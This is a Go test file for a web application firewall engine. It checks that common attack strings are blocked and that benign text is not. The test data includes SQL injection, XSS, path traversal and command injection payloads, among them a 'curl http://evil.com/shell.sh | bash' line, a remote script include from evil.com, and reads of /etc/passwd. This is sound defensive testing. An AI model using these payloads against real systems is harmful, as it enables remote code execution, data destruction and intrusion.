package application_test

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/tensairod/edge-waf-engine/internal/application"
	"github.com/tensairod/edge-waf-engine/internal/domain"
)

// evaluateQueryValue é um helper que monta uma RequestContext com um
// único valor de query "value" e devolve o Verdict da avaliação — a
// maioria dos payloads de teste aqui só precisa disso.
func evaluateQueryValue(t *testing.T, ruleSet domain.RuleSet, value string) domain.Verdict {
	t.Helper()
	ctx, err := domain.NewRequestContext(domain.RequestContextParams{
		Method:   "GET",
		Path:     "/search",
		SourceIP: "203.0.113.42",
		Query:    map[string][]string{"q": {value}},
	})
	require.NoError(t, err)
	return application.NewDetectionEngine(ruleSet).Evaluate(ctx)
}

func evaluateBodyValue(t *testing.T, ruleSet domain.RuleSet, value string) domain.Verdict {
	t.Helper()
	ctx, err := domain.NewRequestContext(domain.RequestContextParams{
		Method:   "POST",
		Path:     "/comments",
		SourceIP: "203.0.113.42",
		Body:     value,
	})
	require.NoError(t, err)
	return application.NewDetectionEngine(ruleSet).Evaluate(ctx)
}

// --- Verdadeiros positivos: payloads de ataque reais (RNF03) ---
// A maioria inspirada diretamente no OWASP Testing Guide.

func TestDefaultRuleSet_DetectsRealSQLInjectionPayloads(t *testing.T) {
	ruleSet, err := application.NewDefaultRuleSet()
	require.NoError(t, err)

	payloads := []string{
		"1 UNION SELECT username, password FROM users",
		"' OR '1'='1",
		"' OR 'a'='a",
		"1' or '1' = '1",
		"admin'--",
		"admin' #",
		"1; DROP TABLE users",
		"1; DELETE FROM accounts",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			verdict := evaluateQueryValue(t, ruleSet, payload)
			assert.True(t, verdict.IsBlocked(), "payload deveria ter sido bloqueado: %q", payload)
		})
	}
}

func TestDefaultRuleSet_DetectsRealXSSPayloads(t *testing.T) {
	ruleSet, err := application.NewDefaultRuleSet()
	require.NoError(t, err)

	payloads := []string{
		"<script>alert(1)</script>",
		"<script src=//evil.com/x.js>",
		`<img src=x onerror=alert(1)>`,
		`<body onload=alert('xss')>`,
		`<a href="javascript:alert(1)">click</a>`,
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			verdict := evaluateBodyValue(t, ruleSet, payload)
			assert.True(t, verdict.IsBlocked(), "payload deveria ter sido bloqueado: %q", payload)
		})
	}
}

func TestDefaultRuleSet_DetectsRealPathTraversalPayloads(t *testing.T) {
	ruleSet, err := application.NewDefaultRuleSet()
	require.NoError(t, err)

	payloads := []string{
		"../../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"%2e%2e%2f%2e%2e%2fetc/passwd",
		"/var/www/../../etc/passwd",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			verdict := evaluateQueryValue(t, ruleSet, payload)
			assert.True(t, verdict.IsBlocked(), "payload deveria ter sido bloqueado: %q", payload)
		})
	}
}

func TestDefaultRuleSet_DetectsRealCommandInjectionPayloads(t *testing.T) {
	ruleSet, err := application.NewDefaultRuleSet()
	require.NoError(t, err)

	payloads := []string{
		"; cat /etc/passwd",
		"| whoami",
		"&& curl http://evil.com/shell.sh | bash",
		"$(whoami)",
		"`whoami`",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			verdict := evaluateQueryValue(t, ruleSet, payload)
			assert.True(t, verdict.IsBlocked(), "payload deveria ter sido bloqueado: %q", payload)
		})
	}
}

// --- Verdadeiros negativos: tráfego legítimo (RNF04) ---
// Cada um destes representa um padrão comum de uso real que NÃO deveria
// disparar nenhuma regra — é tão importante quanto os testes acima.

func TestDefaultRuleSet_DoesNotFlagLegitimateTraffic(t *testing.T) {
	ruleSet, err := application.NewDefaultRuleSet()
	require.NoError(t, err)

	legitimate := []string{
		"O'Brien",                                // apóstrofo isolado, sem tautologia
		"I'd like to order and pay now",          // contém "and" mas sem comparação
		"search for union of two labor unions",   // contém "union" mas sem "select" na sequência
		"my.path.to.file.txt",                    // pontos, mas não é sequência de traversal
		"version 1.2.3",                          // pontos e números comuns
		"contact us at info@example.com",         // email comum
		"click here to buy now",                  // "click" sem handler de evento
		"the meeting is scheduled for 3pm",       // texto comum
		"cats and dogs are popular pets",         // contém "cat" mas sem punctuation de shell antes
		"price: $100 (limited offer)",            // cifrão e parênteses, mas não é subshell
		"use a semicolon; then continue writing", // ponto e vírgula em prosa comum
		"config.yaml",                            // extensão de arquivo comum
	}

	for _, payload := range legitimate {
		t.Run(payload, func(t *testing.T) {
			verdict := evaluateQueryValue(t, ruleSet, payload)
			assert.False(t, verdict.IsBlocked(), "falso positivo em tráfego legítimo: %q (violações: %v)", payload, verdict.Violations())
		})
	}
}

func TestDefaultRuleSet_HasNoDuplicateRuleIDs(t *testing.T) {
	// Confirma que o próprio conjunto de regras é internamente consistente
	// (NewRuleSet já validaria isso, mas o teste documenta a expectativa).
	ruleSet, err := application.NewDefaultRuleSet()

	require.NoError(t, err)
	assert.Greater(t, ruleSet.Len(), 0)
}

func TestDefaultRuleSet_CoversAllFourCategories(t *testing.T) {
	ruleSet, err := application.NewDefaultRuleSet()
	require.NoError(t, err)

	categories := make(map[domain.Category]bool)
	for _, rule := range ruleSet.Rules() {
		categories[rule.Category()] = true
	}

	assert.True(t, categories[domain.CategorySQLInjection])
	assert.True(t, categories[domain.CategoryXSS])
	assert.True(t, categories[domain.CategoryPathTraversal])
	assert.True(t, categories[domain.CategoryCommandInjection])
}
